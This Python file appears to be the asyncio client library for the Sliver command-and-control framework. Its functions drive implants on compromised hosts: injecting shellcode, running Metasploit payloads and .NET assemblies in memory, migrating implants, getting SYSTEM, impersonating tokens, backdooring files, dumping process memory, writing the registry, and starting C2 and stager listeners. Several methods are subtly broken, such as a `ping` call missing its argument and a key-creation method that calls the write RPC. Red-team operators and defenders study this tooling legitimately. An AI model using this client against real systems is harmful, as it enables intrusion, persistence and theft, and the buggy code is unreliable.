'''
Sliver Implant Framework
Copyright (C) 2021  Bishop Fox
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
'''


import grpc
import logging
import threading
from uuid import uuid4
from concurrent.futures import ThreadPoolExecutor
from typing import Generator, Union, List, Dict, Callable, Iterator

from .protobuf import common_pb2
from .protobuf import client_pb2
from .protobuf import sliver_pb2
from .pb.rpcpb.services_pb2_grpc import SliverRPCStub
from .config import SliverClientConfig



KB = 1024
MB = 1024 * KB
GB = 1024 * MB
TIMEOUT = 60



class BaseClient(object):

    # 2GB triggers an overflow error in the gRPC library so we do 2GB-1
    MAX_MESSAGE_LENGTH = (2 * GB) - 1

    KEEP_ALIVE_TIMEOUT = 10000
    CERT_COMMON_NAME = 'multiplayer'

    def __init__(self, config: SliverClientConfig):
        self.config = config
        self._channel: grpc.Channel = None
        self._stub: SliverRPCStub = None
        self._log = logging.getLogger(self.__class__.__name__)

    def is_connected(self) -> bool:
        return self._channel is not None

    @property
    def target(self) -> str:
        return "%s:%d" % (self.config.lhost, self.config.lport,)

    @property
    def credentials(self) -> grpc.ChannelCredentials:
        return grpc.ssl_channel_credentials(
            root_certificates=self.config.ca_certificate.encode(),
            private_key=self.config.private_key.encode(),
            certificate_chain=self.config.certificate.encode(),
        )
    
    @property
    def options(self):
        return [
            ('grpc.keepalive_timeout_ms', self.KEEP_ALIVE_TIMEOUT),
            ('grpc.ssl_target_name_override', self.CERT_COMMON_NAME),
            ('grpc.max_send_message_length', self.MAX_MESSAGE_LENGTH),
            ('grpc.max_receive_message_length', self.MAX_MESSAGE_LENGTH),
        ]


class BaseSession(object):

    def __init__(self, session: client_pb2.Session, channel: grpc.Channel, timeout: int = TIMEOUT, logger: Union[logging.Handler, None] = None):
        self._channel = channel
        self._session = session
        self._stub = SliverRPCStub(channel)
        self.timeout = timeout

    def _request(self, pb):
        '''
        Set request attributes based on current session, I'd prefer to return a generic Request
        object, but protobuf for whatever reason doesn't let you assign this type of field directly.

        `pb` in this case is any protobuf message with a .Request field.

        :param pb: A protobuf request object.
        '''
        pb.Request.SessionID = self._session.ID
        pb.Request.Timeout = self.timeout-1
        return pb

    @property
    def session_id(self) -> int:
        return self._session.ID
    
    @property
    def name(self) -> str:
        return self._session.Name
    
    @property
    def hostname(self) -> int:
        return self._session.Hostname
    
    @property
    def uuid(self) -> str:
        return self._session.UUID
    
    @property
    def username(self) -> str:
        return self._session.Username
    
    @property
    def uid(self) -> str:
        return self._session.UID

    @property
    def gid(self) -> str:
        return self._session.GID

    @property
    def os(self) -> str:
        return self._session.OS

    @property
    def arch(self) -> str:
        return self._session.Arch

    @property
    def transport(self) -> str:
        return self._session.Transport

    @property
    def remote_address(self) -> str:
        return self._session.RemoteAddress

    @property
    def pid(self) -> int:
        return self._session.PID

    @property
    def filename(self) -> str:
        return self._session.Filename

    @property
    def last_checkin(self) -> str:
        return self._session.LastCheckin

    @property
    def active_c2(self) -> str:
        return self._session.ActiveC2

    @property
    def version(self) -> str:
        return self._session.Version

    @property
    def evasion(self) -> bool:
        return self._session.Evasion

    @property
    def is_dead(self) -> bool:
        return self._session.IsDead

    @property
    def reconnect_interval(self) -> int:
        return self._session.ReconnectInterval

    @property
    def proxy_url(self) -> str:
        return self._session.ProxyURL


class AsyncInteractiveSession(BaseSession):

    async def ping(self) -> sliver_pb2.Ping:
        '''Send a round trip message to the implant (does NOT use ICMP)

        :return: Protobuf ping object
        :rtype: sliver_pb2.Ping
        '''        
        ping = sliver_pb2.Ping()
        ping.Request = self._request()
        return (await self._stub.Ping(ping, timeout=self.timeout))

    async def ps(self) -> sliver_pb2.Ps:
        '''List the processes of the remote system

        :return: Ps protobuf object
        :rtype: sliver_pb2.Ps
        '''        
        ps = sliver_pb2.PsReq()
        return (await self._stub.Ps(self._request(ps), timeout=self.timeout))
    
    async def terminate(self, pid: int, force=False) -> sliver_pb2.Terminate:
        '''Terminate a remote process

        :param pid: The process ID to terminate.
        :type pid: int
        :param force: Force termination of the process, defaults to False
        :type force: bool, optional
        :return: Protobuf terminate object
        :rtype: sliver_pb2.Terminate
        '''
        terminator = sliver_pb2.TerminateReq()
        terminator.Pid = pid
        terminator.Force = force
        return (await self._stub.Terminate(self._request(terminator), timeout=self.timeout))

    async def ifconfig(self) -> sliver_pb2.Ifconfig:
        '''Get network interface configuration information about the remote system

        :return: Protobuf ifconfig object
        :rtype: sliver_pb2.Ifconfig
        '''
        return (await self._stub.Ifconfig(self._request(sliver_pb2.IfconfigReq(), timeout=self.timeout)))
    
    async def netstat(self, tcp: bool, udp: bool, ipv4: bool, ipv6: bool, listening=True) -> List[sliver_pb2.SockTabEntry]:
        '''Get information about network connections on the remote system.

        :param tcp: Get TCP information
        :type tcp: bool
        :param udp: Get UDP information
        :type udp: bool
        :param ipv4: Get IPv4 connection information
        :type ipv4: bool
        :param ipv6: Get IPv6 connection information
        :type ipv6: bool
        :param listening: Get listening connection information, defaults to True
        :type listening: bool, optional
        :return: Protobuf netstat object
        :rtype: List[sliver_pb2.SockTabEntry]
        '''
        net = sliver_pb2.NetstatReq()
        net.TCP = tcp
        net.UDP = udp
        net.IP4 = ipv4
        net.IP6 = ipv6
        net.Listening = listening
        stat = await self._stub.Netstat(self._request(net), timeout=self.timeout)
        return list(stat.Entries)
    
    async def ls(self, remote_path: str = '.') -> sliver_pb2.Ls:
        '''Get a directory listing from the remote system

        :param remote_path: Remote path
        :type remote_path: str
        :return: Protobuf ls object
        :rtype: sliver_pb2.Ls
        '''        
        ls = sliver_pb2.LsReq()
        ls.Path = remote_path
        return (await self._stub.Ls(self._request(ls), timeout=self.timeout))

    async def cd(self, remote_path: str) -> sliver_pb2.Pwd:
        '''Change the current working directory of the implant

        :param remote_path: Remote path
        :type remote_path: str
        :return: Protobuf pwd object
        :rtype: sliver_pb2.Pwd
        '''
        cd = sliver_pb2.CdReq()
        cd.Path = remote_path
        return (await self._stub.Cd(self._request(cd), timeout=self.timeout))

    async def pwd(self) -> sliver_pb2.Pwd:
        '''Get the implant's current working directory

        :return: Protobuf pwd object
        :rtype: sliver_pb2.Pwd
        '''
        pwd = sliver_pb2.PwdReq()
        return (await self._stub.Pwd(self._request(pwd), timeout=self.timeout))

    async def rm(self, remote_path: str, recursive=False, force=False) -> sliver_pb2.Rm:
        '''Remove a directory or file(s)

        :param remote_path: Remote path
        :type remote_path: str
        :param recursive: Recursively remove file(s), defaults to False
        :type recursive: bool, optional
        :param force: Forcefully remove the file(s), defaults to False
        :type force: bool, optional
        :return: Protobuf rm object
        :rtype: sliver_pb2.Rm
        '''
        rm = sliver_pb2.RmReq()
        rm.Path = remote_path
        rm.Recursive = recursive
        rm.Force = force
        return (await self._stub.Rm(self._request(rm), timeout=self.timeout))

    async def mkdir(self, remote_path: str) -> sliver_pb2.Mkdir:
        '''Make a directory on the remote file system

        :param remote_path: Directory to create
        :type remote_path: str
        :return: Protobuf Mkdir object
        :rtype: sliver_pb2.Mkdir
        '''        
        make = sliver_pb2.MkdirReq()
        make.Path = remote_path
        return (await self._stub.Mkdir(self._request(make), timeout=self.timeout))

    async def download(self, remote_path: str) -> sliver_pb2.Download:
        '''Download a file from the remote file system

        :param remote_path: File to download
        :type remote_path: str
        :return: Protobuf Download object
        :rtype: sliver_pb2.Download
        '''        
        download = sliver_pb2.DownloadReq()
        download.Path = remote_path
        return (await self._stub.Download(self._request(download), timeout=self.timeout))

    async def upload(self, remote_path: str, data: bytes, encoder='') -> sliver_pb2.Upload:
        '''Write data to specified path on remote file system 

        :param remote_path: Remote path
        :type remote_path: str
        :param data: Data to write
        :type data: bytes
        :param encoder: Data encoder ('', 'gzip'), defaults to ''
        :type encoder: str, optional
        :return: Protobuf Upload object
        :rtype: sliver_pb2.Upload
        '''        
        upload = sliver_pb2.UploadReq()
        upload.Path = remote_path
        upload.Data = data
        upload.Encoder = encoder
        return (await self._stub.Upload(self._request(upload), timeout=self.timeout))

    async def process_dump(self, pid: int) -> sliver_pb2.ProcessDump:
        '''Dump a remote process' memory

        :param pid: PID of the process to dump
        :type pid: int
        :return: Protobuf ProcessDump object
        :rtype: sliver_pb2.ProcessDump
        '''        
        procdump = sliver_pb2.ProcessDumpReq()
        procdump.Pid = pid
        return (await self._stub.ProcessDump(self._request(procdump), timeout=self.timeout))

    async def run_as(self, username: str, process_name: str, args: str) -> sliver_pb2.RunAs:
        '''Run a command as another user on the remote system

        :param username: User to run process as
        :type username: str
        :param process_name: Process to execute
        :type process_name: str
        :param args: Arguments to process
        :type args: str
        :return: Protobuf RunAs object
        :rtype: sliver_pb2.RunAs
        '''        
        run_as = sliver_pb2.RunAsReq()
        run_as.Username = username
        run_as.ProcessName = process_name
        run_as.Args.extend(args)
        return (await self._stub.RunAs(self._request(run_as), timeout=self.timeout))

    async def impersonate(self, username: str) -> sliver_pb2.Impersonate:
        '''Impersonate a user using tokens (Windows only)

        :param username: User to impersonate
        :type username: str
        :return: Protobuf Impersonate object
        :rtype: sliver_pb2.Impersonate
        '''        
        impersonate = sliver_pb2.ImpersonateReq()
        impersonate.Username = username
        return (await self._stub.Impersonate(self._request(impersonate), timeout=self.timeout))
    
    async def revert_to_self(self) -> sliver_pb2.RevToSelf:
        '''Revert to self from impersonation context

        :return: Protobuf RevToSelf object
        :rtype: sliver_pb2.RevToSelf
        '''        
        return (await self._stub.RevToSelf(self._request(sliver_pb2.RevToSelfReq()), timeout=self.timeout))
    
    async def get_system(self, hosting_process: str, config: client_pb2.ImplantConfig) -> sliver_pb2.GetSystem:
        '''Attempt to get SYSTEM (Windows only)

        :param hosting_process: Hosting process to attempt gaining privileges
        :type hosting_process: str
        :param config: Implant configuration to be injected into the hosting process
        :type config: client_pb2.ImplantConfig
        :return: Protobuf GetSystem object
        :rtype: sliver_pb2.GetSystem
        '''        
        system = client_pb2.GetSystemReq()
        system.HostingProcess = hosting_process
        system.Config = config
        return (await self._stub.GetSystem(self._request(system), timeout=self.timeout))
    
    async def execute_shellcode(self, data: bytes, rwx: bool, pid: int, encoder='') -> sliver_pb2.Task:
        '''Execute shellcode in-memory

        :param data: Shellcode buffer
        :type data: bytes
        :param rwx: Enable/disable RWX pages
        :type rwx: bool
        :param pid: Process ID to inject shellcode into
        :type pid: int
        :param encoder: Encoder ('', 'gzip'), defaults to ''
        :type encoder: str, optional
        :return: Protobuf Task object
        :rtype: sliver_pb2.Task
        '''        
        return (await self.task(data, rwx, pid, encoder))

    async def task(self, data: bytes, rwx: bool, pid: int, encoder='') -> sliver_pb2.Task:
        '''Execute shellcode in-memory ("Task" is a synonym for shellcode)

        :param data: Shellcode buffer
        :type data: bytes
        :param rwx: Enable/disable RWX pages
        :type rwx: bool
        :param pid: Process ID to inject shellcode into
        :type pid: int
        :param encoder: Encoder ('', 'gzip'), defaults to ''
        :type encoder: str, optional
        :return: Protobuf Task object
        :rtype: sliver_pb2.Task
        '''         
        task = sliver_pb2.TaskReq()
        task.Encoder = encoder
        task.RWXPages = rwx
        task.Pid = pid
        task.Data = data
        return (await self._stub.Task(self._request(task), timeout=self.timeout))
    
    async def msf(self, payload: str, lhost: str, lport: int, encoder: str, iterations: int) -> None:
        '''Execute Metasploit payload on remote system, the payload will be generated by the server
        based on the parameters to this function. The server must be configured with Metasploit.

        :param payload: Payload to generate
        :type payload: str
        :param lhost: Metasploit LHOST parameter
        :type lhost: str
        :param lport: Metasploit LPORT parameter
        :type lport: int
        :param encoder: Metasploit encoder
        :type encoder: str
        :param iterations: Iterations for Metasploit encoder
        :type iterations: int
        '''        
        msf = client_pb2.MSFReq()
        msf.Payload = payload
        msf.LHost = lhost
        msf.LPort = lport
        msf.Encoder = encoder
        msf.Iterations = iterations
        return (await self._stub.Msf(self._request(msf), timeout=self.timeout))

    async def msf_remote(self, payload: str, lhost: str, lport: int, encoder: str, iterations: int, pid: int) -> None:
        '''Execute Metasploit payload in a remote process, the payload will be generated by the server
        based on the parameters to this function. The server must be configured with Metasploit.

        :param payload: Payload to generate
        :type payload: str
        :param lhost: Metasploit LHOST parameter
        :type lhost: str
        :param lport: Metasploit LPORT parameter
        :type lport: int
        :param encoder: Metasploit encoder
        :type encoder: str
        :param iterations: Iterations for Metasploit encoder
        :type iterations: int
        :param pid: Process ID to inject the payload into
        :type pid: int
        ''' 
        msf = client_pb2.MSFRemoteReq()
        msf.Payload = payload
        msf.LHost = lhost
        msf.LPort = lport
        msf.Encoder = encoder
        msf.Iterations = iterations
        msf.PID = pid
        return (await self._stub.Msf(self._request(msf), timeout=self.timeout))
    
    async def execute_assembly(self, assembly: bytes, arguments: str, process: str, is_dll: bool, arch: str, class_name: str, method: str, app_domain: str) -> sliver_pb2.ExecuteAssembly:
        '''Execute a .NET assembly in-memory on the remote system

        :param assembly: A buffer of the .NET assembly to execute
        :type assembly: bytes
        :param arguments: Arguments to the .NET assembly
        :type arguments: str
        :param process: Process to execute assembly
        :type process: str
        :param is_dll: Is assembly a DLL
        :type is_dll: bool
        :param arch: Assembly architecture
        :type arch: str
        :param class_name: Class name of the assembly
        :type class_name: str
        :param method: Method to execute
        :type method: str
        :param app_domain: AppDomain
        :type app_domain: str
        :return: Protobuf ExecuteAssembly object
        :rtype: sliver_pb2.ExecuteAssembly
        '''        
        asm = sliver_pb2.ExecuteAssemblyReq()
        asm.Assembly = assembly
        asm.Arguments = arguments
        asm.Process = process
        asm.IsDLL = is_dll
        asm.Arch = arch
        asm.ClassName = class_name
        asm.AppDomain = app_domain
        return (await self._stub.ExecuteAssembly(self._request(asm), timeout=self.timeout))
    
    async def migrate(self, pid: int, config: client_pb2.ImplantConfig) -> sliver_pb2.Migrate:
        '''Migrate implant to another process

        :param pid: Proccess ID to inject implant into
        :type pid: int
        :param config: Implant configuration to inject into the remote process
        :type config: client_pb2.ImplantConfig
        :return: Protobuf Migrate object
        :rtype: sliver_pb2.Migrate
        '''        
        migrate = client_pb2.MigrateReq()
        migrate.Pid = pid
        migrate.Config = config
        return (await self._stub.Migrate(self._request(migrate), timeout=self.timeout))

    async def execute(self, exe: str, args: List[str], output: bool) -> sliver_pb2.Execute:
        '''Execute a command/subprocess on the remote system

        :param exe: Command/subprocess to execute
        :type exe: str
        :param args: Arguments to the command/subprocess
        :type args: List[str]
        :param output: Enable capturing command/subprocess stdout
        :type output: bool
        :return: Protobuf Execute object
        :rtype: sliver_pb2.Execute
        '''        
        exec = sliver_pb2.ExecuteReq()
        exec.Path = exe
        exec.Args.extend(args)
        exec.Output = output
        return (await self._stub.Execute(self._request(exec), timeout=self.timeout))
    
    async def execute_token(self, exe: str, args: List[str], output: bool) -> sliver_pb2.Execute:
        '''Execute a comman/subprocess on the remote system in the context of the current user token

        :param exe: Command/subprocess to execute
        :type exe: str
        :param args: Arguments to the command/subprocess
        :type args: List[str]
        :param output: Enable capturing command/subprocess stdout
        :type output: bool
        :return: Protobuf Execute object
        :rtype: sliver_pb2.Execute
        '''        
        execToken = sliver_pb2.ExecuteTokenReq()
        execToken.Path = exe
        execToken.Args.extend(args)
        execToken.Output = output
        return (await self._stub.ExecuteToken(self._request(execToken), timeout=self.timeout))
    
    async def sideload(self, data: bytes, process_name: str, arguments: str, entry_point: str, kill: bool) -> sliver_pb2.Sideload:
        side = sliver_pb2.SideloadReq()
        side.Data = data
        side.ProcessName = process_name
        side.Args = arguments
        side.EntryPoint = entry_point
        side.Kill = kill
        return (await self._stub.Sideload(self._request(side), timeout=self.timeout))
    
    async def spawn_dll(self, data: bytes, process_name: str, arguments: str, entry_point: str, kill: bool) -> sliver_pb2.SpawnDll:
        spawn = sliver_pb2.InvokeSpawnDllReq()
        spawn.Data = data
        spawn.ProcessName = process_name
        spawn.Args = arguments
        spawn.EntryPoint = entry_point
        spawn.Kill = kill
        return (await self._stub.SpawnDll(self._request(spawn), timeout=self.timeout))
    
    async def screenshot(self) -> sliver_pb2.Screenshot:
        return (await self._stub.Screenshot(self._request(sliver_pb2.ScreenshotReq()), timeout=self.timeout))
    
    async def named_pipes(self, pipe_name: str) -> sliver_pb2.NamedPipes:
        pipe = sliver_pb2.NamedPipesReq()
        pipe.PipeName = pipe_name
        return (await self._stub.NamedPipes(self._request(pipe), timeout=self.timeout))

    async def tcp_pivot_listener(self, address: str) -> sliver_pb2.TCPPivot:
        pivot = sliver_pb2.TCPPivotReq()
        pivot.Address = address
        return (await self._stub.TCPListener(self._request(pivot), timeout=self.timeout))
    
    async def pivots(self) -> List[sliver_pb2.PivotEntry]:
        pivots = await self._stub.ListPivots(self._request(sliver_pb2.PivotListReq()), timeout=self.timeout)
        return list(pivots.Entries)

    async def start_service(self, name: str, description: str, exe: str, hostname: str, arguments: str) -> sliver_pb2.ServiceInfo:
        svc = sliver_pb2.StartServiceReq()
        svc.ServiceName = name
        svc.ServiceDescription = description
        svc.BinPath = exe
        svc.Hostname = hostname
        svc.Arguments = arguments
        return (await self._stub.StartService(self._request(svc), timeout=self.timeout))
    
    async def stop_service(self, name: str, hostname: str) -> sliver_pb2.ServiceInfo:
        svc = sliver_pb2.StopServiceReq()
        svc.ServiceInfo.ServiceName = name
        svc.ServiceInfo.Hostname = hostname
        return (await self._stub.StopService(self._request(svc), timeout=self.timeout))

    async def remove_service(self, name: str, hostname: str) -> sliver_pb2.ServiceInfo:
        svc = sliver_pb2.StopServiceReq()
        svc.ServiceInfo.ServiceName = name
        svc.ServiceInfo.Hostname = hostname
        return (await self._stub.RemoveService(self._request(svc), timeout=self.timeout))

    async def make_token(self, username: str, password: str, domain: str) -> sliver_pb2.MakeToken:
        make = sliver_pb2.MakeTokenReq()
        make.Username = username
        make.Password = password
        make.Domain = domain
        return (await self._stub.MakeToken(self._request(make), timeout=self.timeout))

    async def get_env(self, name: str) -> sliver_pb2.EnvInfo:
        env = sliver_pb2.EnvReq()
        env.Name = name
        return (await self._stub.GetEnv(self._request(env), timeout=self.timeout))
    
    async def set_env(self, name: str, value: str) -> sliver_pb2.SetEnv:
        env = sliver_pb2.SetEnvReq()
        env.EnvVar.Key = name
        env.EnvVar.Value = value
        return (await self._stub.SetEnv(self._request(env), timeout=self.timeout))
    
    async def backdoor(self, remote_path: str, profile_name: str) -> sliver_pb2.Backdoor:
        backdoor = sliver_pb2.BackdoorReq()
        backdoor.FilePath = remote_path
        backdoor.ProfileName = profile_name
        return (await self._stub.Backdoor(self._request(backdoor), timeout=self.timeout))
    
    async def registry_read(self, hive: str, reg_path: str, key: str, hostname: str) -> sliver_pb2.RegistryRead:
        reg = sliver_pb2.RegistryReadReq()
        reg.Hive = hive
        reg.Path = reg_path
        reg.Key = key
        reg.Hostname = hostname
        return (await self._stub.RegistryRead(self._request(reg), timeout=self.timeout))

    async def registry_write(self, hive: str, reg_path: str, key: str, hostname: str, string_value: str, byte_value: bytes, dword_value: int, qword_value: int, reg_type: sliver_pb2.RegistryType) -> sliver_pb2.RegistryWrite:
        reg = sliver_pb2.RegistryWriteReq()
        reg.Hive = hive
        reg.Path = reg_path
        reg.Key = key
        reg.Hostname = hostname
        reg.StringValue = string_value
        reg.ByteValue = byte_value
        reg.DWordValue = dword_value
        reg.QWordValue = qword_value
        reg.Type = reg_type
        return (await self._stub.RegistryWrite(self._request(reg), timeout=self.timeout))
    
    async def registry_create_key(self, hive: str, reg_path: str, key: str, hostname: str) -> sliver_pb2.RegistryCreateKey:
        reg = sliver_pb2.RegistryCreateKey()
        reg.Hive = hive
        reg.Path = reg_path
        reg.Key = key
        reg.Hostname = hostname
        return (await self._stub.RegistryWrite(self._request(reg), timeout=self.timeout))


class AsyncSliverClient(BaseClient):

    ''' Asyncio client implementation '''

    session_event_types = ["session-connected", "session-disconnected"]
    job_event_types = ["job-started", "job-stopped"]
    canary_event_types = ["canary"]

    async def connect(self) -> client_pb2.Version:
        '''Establish a connection to the Sliver server

        :return: Protobuf Version object, containing the server's version information
        :rtype: client_pb2.Version
        '''        
        self._channel = grpc.aio.secure_channel(
            target=self.target,
            credentials=self.credentials,
            options=self.options,
        )
        self._stub = SliverRPCStub(self._channel)
        return (await self.version())

    async def interact(self, session_id: int, timeout=TIMEOUT) -> Union[AsyncInteractiveSession, None]:
        '''Interact with a session, returns an :class:`AsyncInteractiveSession`

        :param session_id: Numeric session ID
        :type session_id: int
        :param timeout: gRPC timeout, defaults to 60 seconds
        :return: An interactive session
        :rtype: Union[AsyncInteractiveSession, None]
        '''
        session = await self.session_by_id(session_id, timeout)
        if session is not None:
            return AsyncInteractiveSession(session, self._channel, timeout)

    async def session_by_id(self, session_id: int, timeout=TIMEOUT) -> Union[client_pb2.Session, None]:
        '''Get the session information from an numeric session ID

        :param session_id: Numeric session ID
        :type session_id: int
        :param timeout: gRPC timeout, defaults to 60 seconds
        :return: Protobuf Session object
        :rtype: Union[client_pb2.Session, None]
        '''
        sessions = await self.sessions(timeout)
        for session in sessions:
            if session.ID == session_id:
                return session
        return None

    async def events(self) -> Generator[client_pb2.Event, None, None]:
        '''All events

        :yield: A stream of events
        :rtype: client_pb2.Event
        '''
        async for event in self._stub.Events(common_pb2.Empty()):
            yield event

    async def on(self, event_types: Union[str, List[str]]) -> Generator[client_pb2.Event, None, None]:
        '''Iterate on a specific event or list of events

        :param event_types: An event type or list of event types
        :type event_types: Union[str, List[str]]
        :yield: A stream of events of the given type(s)
        :rtype: client_pb2.Event
        '''        
        if isinstance(event_types, str):
            event_types = [event_types]
        async for event in self.events():
            if event.EventType in event_types:
                yield event

    async def version(self, timeout=TIMEOUT) -> client_pb2.Version:
        '''Get server version information

        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf Version object
        :rtype: client_pb2.Version
        '''
        return (await self._stub.GetVersion(common_pb2.Empty(), timeout=timeout))

    async def operators(self, timeout=TIMEOUT) -> List[client_pb2.Operator]:
        '''Get a list of operators and their online status

        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: List of protobuf Operator objects
        :rtype: List[client_pb2.Operator]
        '''
        operators = await self._stub.GetOperators(common_pb2.Empty(), timeout=timeout)
        return list(operators.Operators)

    async def sessions(self, timeout=TIMEOUT) -> List[client_pb2.Session]:
        '''Get a list of active sessions

        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: List of protobuf Session objects
        :rtype: List[client_pb2.Session]
        '''
        sessions: client_pb2.Sessions = await self._stub.GetSessions(common_pb2.Empty(), timeout=timeout)
        return list(sessions.Sessions)

    async def update_session(self, session_id: int, name: str, timeout=TIMEOUT) -> client_pb2.Session:
        '''Update a session attribute (such as name)

        :param session_id: Numeric session ID to update
        :type session_id: int
        :param name: Rename session to this value
        :type name: str
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Updated protobuf session object
        :rtype: client_pb2.Session
        '''
        update = client_pb2.UpdateSession()
        update.SessionID = session_id
        update.Name = name
        return (await self._stub.UpdateSession(update, timeout=timeout))

    async def kill_session(self, session_id: int, force=False, timeout=TIMEOUT) -> None:
        '''Kill a session

        :param session_id: The numeric session ID to kill
        :type session_id: int
        :param force: Force kill the session, defaults to False
        :type force: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        '''
        kill = sliver_pb2.KillSessionReq()
        kill.Request.SessionID = session_id
        kill.Request.Timeout = timeout-1
        kill.Force = force
        await self._stub.KillSession(kill, timeout=timeout)

    async def jobs(self, timeout=TIMEOUT) -> List[client_pb2.Job]:
        '''Get a list of active jobs

        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: List of protobuf Job objects
        :rtype: List[client_pb2.Job]
        '''        
        jobs: client_pb2.Jobs = await self._stub.GetJobs(common_pb2.Empty(), timeout=timeout)
        return list(jobs.Jobs)

    async def kill_job(self, job_id: int, timeout=TIMEOUT) -> client_pb2.KillJob:
        '''Kill a job

        :param job_id: Numeric job ID to kill
        :type job_id: int
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf KillJob object
        :rtype: client_pb2.KillJob
        '''
        kill = client_pb2.KillJobReq()
        kill.ID = job_id
        return (await self._stub.KillJob(kill, timeout=timeout))

    async def start_mtls_listener(self, host: str, port: int, persistent=False, timeout=TIMEOUT) -> client_pb2.MTLSListener:
        '''Start a mutual TLS (mTLS) C2 listener

        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf MTLSListener object
        :rtype: client_pb2.MTLSListener
        '''
        mtls = client_pb2.MTLSListenerReq()
        mtls.Host = host
        mtls.Port = port
        mtls.Persistent = persistent
        return (await self._stub.StartMTLSListener(mtls, timeout=timeout))

    async def start_wg_listener(self, port: int, tun_ip: str, n_port: int = 8888, key_port: int = 1337, persistent=False, timeout=TIMEOUT) -> client_pb2.WGListener:
        '''Start a WireGuard (wg) C2 listener

        :param port: UDP port to start listener on
        :type port: int
        :param tun_ip: Virtual TUN IP listen address
        :type tun_ip: str
        :param n_port: Virtual TUN port number
        :type n_port: int
        :param key_port: Virtual TUN port number for key exchanges
        :type key_port: int
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf WGListener object
        :rtype: client_pb2.WGListener
        '''
        wg = client_pb2.WGListenerReq()
        wg.Port = port
        wg.TunIP = tun_ip
        wg.NPort = n_port
        wg.KeyPort = key_port
        wg.Persistent = persistent
        return (await self._stub.StartWGListener(wg, timeout=timeout))

    async def start_dns_listener(self, domains: List[str], canaries: bool, host: str, port: int, persistent=False, timeout=TIMEOUT) -> client_pb2.DNSListener:
        '''Start a DNS C2 listener

        :param domains: C2 domains to listen for
        :type domains: List[str]
        :param canaries: Enable/disable DNS canaries
        :type canaries: bool
        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf DNSListener object
        :rtype: client_pb2.DNSListener
        '''
        dns = client_pb2.DNSListenerReq()
        dns.Domains.extend(domains)
        dns.Canaries = canaries
        dns.Host = host
        dns.Port = port
        dns.Persistent = persistent
        return (await self._stub.StartDNSListener(dns, timeout=timeout))

    async def start_https_listener(self, domain: str, host: str, port: int, website: str, cert: bytes, key: bytes, acme: bool, persistent=False, timeout=TIMEOUT) -> client_pb2.HTTPListener:
        '''Start an HTTPS C2 listener

        :param domain: Domain name for HTTPS server (one domain per listener)
        :type domain: str
        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param website: Name of the "website" to host on listener
        :type website: str
        :param cert: TLS certificate (leave blank to generate self-signed certificate)
        :type cert: bytes
        :param key: TLS private key (leave blank to generate self-signed certificate)
        :type key: bytes
        :param acme: Automatically provision TLS certificate using ACME (i.e., Let's Encrypt)
        :type acme: bool
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf HTTPListener object (NOTE: HTTP/HTTPS both return HTTPListener objects)
        :rtype: client_pb2.HTTPListener
        '''
        http = client_pb2.HTTPListenerReq()
        http.Domain = domain
        http.Host = host
        http.Port = port
        http.Secure = True
        http.Website = website
        http.Cert = cert
        http.Key = key
        http.ACME = acme
        http.Persistent = persistent
        return (await self._stub.StartHTTPListener(http, timeout=timeout))

    async def start_http_listener(self, domain: str, host: str, port: int, secure: bool, website: str, persistent=False, timeout=TIMEOUT) -> client_pb2.HTTPListener:
        '''Start an HTTP C2 listener

        :param domain: Domain name for HTTP server (one domain per listener)
        :type domain: str
        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param website: Name of the "website" to host on listener
        :type website: str
        :param persistent: Register the listener as a persistent job (automatically start with server), defaults to False
        :type persistent: bool, optional
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf HTTPListener object (NOTE: HTTP/HTTPS both return HTTPListener objects)
        :rtype: client_pb2.HTTPListener
        '''
        http = client_pb2.HTTPListenerReq()
        http.Domain = domain
        http.Host = host
        http.Port = port
        http.Secure = False
        http.Website = website
        http.ACME = False
        http.Persistent = persistent
        return (await self._stub.StartHTTPListener(http, timeout=timeout))

    async def start_tcp_stager_listener(self, host: str, port: int, data: bytes, timeout=TIMEOUT) -> client_pb2.StagerListener:
        '''Start a TCP stager listener

        :param host: Host interface to bind the listener to, an empty string will bind to all interfaces
        :type host: str
        :param port: TCP port number to start listener on
        :type port: int
        :param data: Binary data of stage to host on listener
        :type data: bytes
        :param timeout: gRPC timeout, defaults to 60 seconds
        :type timeout: int, optional
        :return: Protobuf StagerListener object
        :rtype: client_pb2.StagerListener
        '''
        stage = client_pb2.StagerListenerReq()
        stage.Protocol = client_pb2.TCP
        stage.Host = host
        stage.Port = port
        stage.Data = data
        return (await self._stub.StartTCPStagerListener(stage, timeout=timeout))

